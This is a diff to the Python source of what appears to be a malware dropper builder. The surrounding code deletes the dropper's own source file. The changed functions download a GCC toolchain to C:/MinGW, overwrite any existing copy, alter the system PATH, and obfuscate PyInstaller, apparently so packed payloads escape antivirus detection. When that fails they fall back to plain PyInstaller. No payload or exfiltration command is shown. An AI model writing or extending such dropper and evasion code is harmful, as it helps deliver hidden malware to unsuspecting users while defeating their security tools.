@@ -90,30 +90,53 @@ def {obfuscated_main_function}():
     os.remove(dropper_py_file)  # remove the python dropper code.
     return
 
+def default_pyinstaller_way(pyInstallerDir : str, pyInstallerZip : str,path_to_python : str) -> bool:
+    """
+    if we failed in compiling the bootloader, we will just install the "plain"
+    pyinstaller, and keep it up with the dropper
+    """
+    if os.path.exists(pyInstallerDir):
+        time.sleep(5)  # we wait to make sure we have no handle of the obfuscation active
+        try:
+            shutil.rmtree(pyInstallerDir)
+        except Exception as e:
+            pass
+    randPyinstaller = random_string(is_random=True)
+    extract_zip(pyInstallerDir + randPyinstaller, pyInstallerZip)
+    extraction_location = pyInstallerDir + randPyinstaller + \
+                          '/' + pyInstallerDir.split('/')[::-1][0].replace('.zip', '')
+    os.chdir(extraction_location)
+    os.system(f"{path_to_python} setup.py install")
+    return True
 
-def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
+
+def download_gcc(path_to_python : str) -> bool:
+    gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
+    PATH = tempFolder.format(os.getlogin(), "gcc.zip")
+    GCC_EXTRACTION_PATH = "c:/MinGW"
+    if os.path.exists(PATH):
+        os.remove(PATH)
+    if os.path.exists(GCC_EXTRACTION_PATH):
+        shutil.rmtree(GCC_EXTRACTION_PATH)
+    if download_file(path=PATH, URL=gcc):
+        extract_zip(extraction_path=GCC_EXTRACTION_PATH, file_to_extract=PATH)
+    set_env_variable('PATH', r'C:\MinGW\mingw64\bin')
+    ctypes_update_system()
+    if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=path_to_python).obfuscate():
+        obfuscate_files(extraction_path=BaseTempFolder.format(os.getlogin()), name="test",
+                        base_path=tempFolder.format(os.getlogin(), "try_this"),
+                        pythonPath=path_to_python)
+        # obfuscate files dont actually do anything!
+        return True
+    return False
+
+def get_pyinstaller(pythonPath: str) -> bool:
     """
     :param str pythonPath: abs path to python.exe}
-    :param bool admin: specify if we got admin permissions.
-    //TODO 5: create 3 functions from this one. one for each condition.
+    //TODO 34: CYTHONIZE
     """
     PATH = tempFolder.format(os.getlogin(),"pyinstaller-4.7.zip")
     pyinstaller_dir = PATH.replace('.zip', '')
-    if failed_obfuscate:
-        if os.path.exists(pyinstaller_dir):
-            time.sleep(5)  # we wait to make sure we have no handle of the obfuscation active
-            try:
-                shutil.rmtree(pyinstaller_dir)
-            except Exception as e:
-                pass
-        randPyinstaller = random_string(is_random=True)
-        extract_zip(pyinstaller_dir+randPyinstaller, PATH)
-        extraction_location = pyinstaller_dir+randPyinstaller+\
-                              '/'+pyinstaller_dir.split('/')[::-1][0].replace('.zip','')
-        os.chdir(extraction_location)
-        os.system(f"{pythonPath} setup.py install")
-        # we install python WITHOUT obfuscatio
-        return
     if os.path.exists(PATH):
         if os.path.exists(pyinstaller_dir):
             shutil.rmtree(pyinstaller_dir)
@@ -121,39 +144,15 @@ def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
     if not download_pyinstaller(PATH):
         # assume pyinstaller extracted in the PATH
         print("[*] Unknown error in extracting and downloading pyinstaller")
-    if admin:
-        if is_msvc_exist():
-            if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
-                return
-        else:
-            gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
-            PATH = tempFolder.format(os.getlogin(),"gcc.zip")
-            GCC_EXTRACTION_PATH = "c:/MinGW"
-            if os.path.exists(PATH):
-                os.remove(PATH)
-            if os.path.exists(GCC_EXTRACTION_PATH):
-                shutil.rmtree(GCC_EXTRACTION_PATH)
-            if download_file(path=PATH, URL=gcc):
-                extract_zip(extraction_path=GCC_EXTRACTION_PATH, file_to_extract=PATH)
-            set_env_variable('PATH',r'C:\MinGW\mingw64\bin')
-            ctypes_update_system()
-            if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
-                obfuscate_files(extraction_path=BaseTempFolder.format(os.getlogin()), name="test",
-                                base_path=tempFolder.format(os.getlogin(),"try_this"),
-                                pythonPath=pythonPath)
-            else:
-                return get_pyinstaller(pythonPath, failed_obfuscate=True)
-            # get gcc?
-            pass
-    # no admin
+        return False
     if is_msvc_exist():
-        # assume your are not admin, but pyinstaller exist and you have msvc
-        # TODO 6:// detect other C COMPILERS
-        return
-    # IF WE GOT HERE. WE HAVE NO C COMPILERS AND NO ADMIN RIGHTS.
-    # WE SHOULD JUST OBFUSCATE OUR CODE,AND USE PYINSTALLER TO INSTALL IT.
+        if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
+            return True
+        return False
+    if download_gcc(pythonPath):
+        return True
+    return default_pyinstaller_way(pyinstaller_dir,PATH,pythonPath)
 
-    pass
 
 
 def pip_install(new_path=None):
